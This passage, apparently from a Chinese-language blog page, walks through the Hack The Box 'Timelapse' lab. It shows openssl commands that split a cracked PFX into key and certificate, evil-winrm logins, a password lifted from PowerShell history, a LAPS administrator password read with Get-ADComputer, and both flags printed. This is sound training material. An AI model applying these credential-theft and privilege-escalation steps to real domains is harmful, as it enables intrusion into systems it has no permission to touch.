class="hljs-number">23</span>:<span class="hljs-number">07</span>) <span class="hljs-number">0.01357</span>g/s <span class="hljs-number">43873</span>p/s <span class="hljs-number">43873</span>c/s <span class="hljs-number">43873</span>C/s thyriana..thsco04<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<p>8、经过摸索，可以知道这个是个秘钥证书，可以分离出来一个证书和一个秘钥，然后使用这两个文件就可以登录服务器了</p>
+<p><code>https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</code></p>
+<p><img src="http://sh1yan.top/photo/Timelapse-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、提取密钥，有了密码，我就可以提取密钥和证书。提取密钥时，它会要求输入密码（我将提供“thuglegacy”），然后是输出.pem文件的密码（我想要的任何内容，必须至少为四个字符）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc<br>Enter Import Password:<br>Enter PEM pass phrase:<br>Verifying - Enter PEM pass phrase:<br></code></pre></td></tr></table></figure>
+
+<p>10、我将使用上面设置的密码解密密钥，这样我就不必记住它：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key<br>Enter pass phrase <span class="hljs-keyword">for</span> legacyy_dev_auth.key-enc:<br>writing RSA key<br></code></pre></td></tr></table></figure>
+
+<p>11、并转储证书：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt<br>Enter Import Password:<br></code></pre></td></tr></table></figure>
+
+<p>12、evil-winrm是从 Linux 主机连接到 WinRM 的最佳工具。查看用法显示我将如何使用这些键进行连接：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">-S- 启用 SSL，因为我正在连接到 <span class="hljs-number">5986</span>；<br>-c legacyy_dev_auth.crt- 提供公钥证书<br>-k legacyy_dev_auth.key- 提供私钥<br>-i timelapse.htb- 要连接的主机<br></code></pre></td></tr></table></figure>
+
+<p>13、尝试进行连接</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt<br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Warning: SSL enabled<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami<br>timelapse\legacyy<br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; dir<br><br><br>    Directory: C:\Users\legacyy\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">3</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>t*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>14、读取第一个flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; type user.txt<br><span class="hljs-number">52787067844</span>ef122efe2d2a0dc2fdfc2<br>*Evil-WinRM* PS C:\Users\legacyy\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>15、枚举当前用户和用户详细信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami<br>timelapse\legacyy<br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; net user legacyy<br>User name                    legacyy<br>Full Name                    Legacyy<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">10</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">10</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">10</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">17</span>:<span class="hljs-number">10</span> PM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span> <span class="hljs-number">3</span>:<span class="hljs-number">18</span>:<span class="hljs-number">33</span> AM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *Domain Users         *Development<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>16、查看当前用户特权信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt;<br><br><br>net group <span class="hljs-string">&quot;Domain Users&quot;</span> /domain<br><br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>17、查询当前域用户组成员</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; net group <span class="hljs-string">&quot;Domain Users&quot;</span> /domain<br>Group name     Domain Users<br>Comment        All domain users<br><br>Members<br><br>-------------------------------------------------------------------------------<br>Administrator            babywyrm                 krbtgt<br>legacyy                  payl0ad                  sinfulz<br>svc_deploy               thecybergeek             TRX<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>18、检索powershell 历史记录信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; (Get-PSReadlineOption).HistorySavePath<br>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt<br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; <br><br><br>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\<br>*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; dir<br><br><br>    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----         <span class="hljs-number">3</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">46</span> PM            <span class="hljs-number">434</span> ConsoleHost_history.txt<br><br><br>*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; cat ConsoleHost_history.txt<br>whoami<br>ipconfig /all<br>netstat -ano |select-<span class="hljs-built_in">string</span> LIST<br>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br>$p = ConvertTo-SecureString <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -AsPlainText -Force<br>$c = New-Object System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;svc_deploy&#x27;</span>, $p)<br>invoke-command -computername localhost -credential $c -port <span class="hljs-number">5986</span> -usessl -<br>SessionOption $so -scriptblock &#123;whoami&#125;<br>get-aduser -filter * -properties *<br><span class="hljs-built_in">exit</span><br>*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt; <br></code></pre></td></tr></table></figure>
+
+<p>19、发现了一个账号密码信息，尝试进行登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i timelapse.htb -u svc_deploy -p <span class="hljs-string">&#x27;E3R$Q62^12p7PLlC%KWaxuaV&#x27;</span> -S<br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Warning: SSL enabled<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>20、继续查看当前用户信息和特权情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami<br>timelapse\svc_deploy<br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; net user svc_deploy<br>User name                    svc_deploy<br>Full Name                    svc_deploy<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">10</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:<span class="hljs-number">37</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">10</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:<span class="hljs-number">37</span> PM<br>Password required            Yes<br>User may change password     Yes<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory<br>Last logon                   <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span> <span class="hljs-number">3</span>:<span class="hljs-number">50</span>:<span class="hljs-number">13</span> AM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *LAPS_Readers         *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>21、查看当前用户新发现的这个异常组的情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; net groups <span class="hljs-string">&quot;LAPS_Readers&quot;</span> /domain<br>Group name     LAPS_Readers<br>Comment<br><br>Members<br><br>-------------------------------------------------------------------------------<br>svc_deploy<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<p>22、经过各种搜集，发现了以下信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">通过 LAPS，DC 可以管理域中计算机的本地管理员密码。创建一组用户并授予他们读取这些密码的权限是很常见的，从而允许受信任的管理员访问所有本地管理员密码。<br><br>要读取 LAPS 密码，我只需要使用Get-ADComputer并特别请求该ms-mcs-admpwd属性：<br><br>Get-ADComputer DC01 -property <span class="hljs-string">&#x27;ms-mcs-admpwd&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>23、按照提示，获取管理员密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Get-ADComputer DC01 -property <span class="hljs-string">&#x27;ms-mcs-admpwd&#x27;</span><br><br><br>DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb<br>DNSHostName       : dc01.timelapse.htb<br>Enabled           : True<br>ms-mcs-admpwd     : S92[l]pPJ8bYZI%<span class="hljs-number">0</span>dS1siQ;<span class="hljs-number">1</span><br>Name              : DC01<br>ObjectClass       : computer<br>ObjectGUID        : <span class="hljs-number">6e10</span>b102<span class="hljs-number">-6936</span><span class="hljs-number">-41</span>aa-bb98-bed624c9b98f<br>SamAccountName    : DC01$<br>SID               : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-671920749</span><span class="hljs-number">-559770252</span><span class="hljs-number">-3318990721</span><span class="hljs-number">-1000</span><br>UserPrincipalName :<br><br><br><br>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;<br></code></pre></td></tr></table></figure>
+
+<p>24、尝试使用获取的密码信息进行登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i timelapse.htb -S -u administrator -p <span class="hljs-string">&#x27;S92[l]pPJ8bYZI%0dS1siQ;1&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Warning: SSL enabled<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cd ../../<br>*Evil-WinRM* PS C:\Users&gt; dir<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----       <span class="hljs-number">10</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">27</span> AM                Administrator<br>d-----       <span class="hljs-number">10</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">8</span>:<span class="hljs-number">22</span> AM                legacyy<br>d-r---       <span class="hljs-number">10</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">27</span> AM                Public<br>d-----       <span class="hljs-number">10</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">23</span> PM                svc_deploy<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">5</span>:<span class="hljs-number">45</span> PM                TRX<br><br><br>*Evil-WinRM* PS C:\Users&gt; cd TRX<br>*Evil-WinRM* PS C:\Users\TRX&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\TRX\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>25、获取最终flag信息</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c#">*Evil-WinRM* PS C:\Users\TRX\Desktop&gt; dir<br><br><br>    Directory: C:\Users\TRX\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">59</span> AM             <span class="hljs-number">34</span> root.txt<br><br><br>*Evil-WinRM* PS C:\Users\TRX\Desktop&gt; cat root.txt<br>dc9c080e10210fc114e26296d2500f01<br>*Evil-WinRM* PS C:\Users\TRX\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/452</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Timelapse-htb-writeup</div>
+      <div>https://sh1yan.top/2024/03/19/Timelapse-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/20/Support-htb-writeup/" title="Support-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Support-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/18/Love-htb-writeup/" title="Love-htb-writeup">
+                        <span class="hidden-mobile">Love-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
